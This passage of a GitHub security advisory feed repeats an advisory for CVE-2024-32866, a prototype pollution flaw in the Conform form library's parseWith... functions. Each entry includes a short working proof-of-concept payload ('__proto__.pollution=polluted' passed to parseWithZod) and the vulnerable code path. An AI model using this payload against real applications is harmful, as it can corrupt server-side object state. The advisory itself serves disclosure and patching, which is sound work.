<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef">https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/zod] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-06-10T20:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef">https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/dom] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-06-10T20:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef">https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
</feed>